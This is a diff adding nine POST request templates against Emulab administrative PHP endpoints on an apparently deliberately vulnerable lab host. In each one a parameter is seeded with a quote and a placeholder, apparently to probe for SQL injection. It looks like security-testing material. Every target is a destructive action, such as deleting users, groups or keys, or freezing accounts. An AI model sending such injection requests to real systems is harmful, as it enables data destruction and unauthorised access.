@@ -1,0 +1,9 @@
+post:https://myboss.vulnelab.testbed.emulab.net/swapexp.php3?confirmed=Confirm&eid=testexp3&inout=out&pid='**{swapexp.php3:pid}**
+post:https://myboss.vulnelab.testbed.emulab.net/deleteuser.php3?confirmed=Confirm&target_uid=testusr3&target_pid='**{deleteuser.php3:target_pid}**
+post:https://myboss.vulnelab.testbed.emulab.net/deletegroup.php3?confirmed=Confirm&gid=testgroup3&pid='**{deletegroup.php3:pid}**
+post:https://myboss.vulnelab.testbed.emulab.net/deleteimageid.php3?confirmed=Confirm&imageid='**{deleteimageid.php3:imageid}**
+post:https://myboss.vulnelab.testbed.emulab.net/deleteosid.php3?confirmed=Confirm&osid='**{deleteosid.php3:osid}**
+post:https://myboss.vulnelab.testbed.emulab.net/endexp.php3?confirmed=Confirm&eid=testexp3&pid='**{endexp.php3:pid}**
+post:https://myboss.vulnelab.testbed.emulab.net/deletepubkey.php3?confirmed=Confirm&key=1&target_uid='**{deletepubkey.php3:target_uid}**
+post:https://myboss.vulnelab.testbed.emulab.net/freenode.php3?confirmed=Confirm&node_id='**{freenode.php3:node_id}**
+post:https://myboss.vulnelab.testbed.emulab.net/freezeuser.php3?confirmed=Confirm&target_uid=testusr3&action='**{freezeuser.php3:action}**
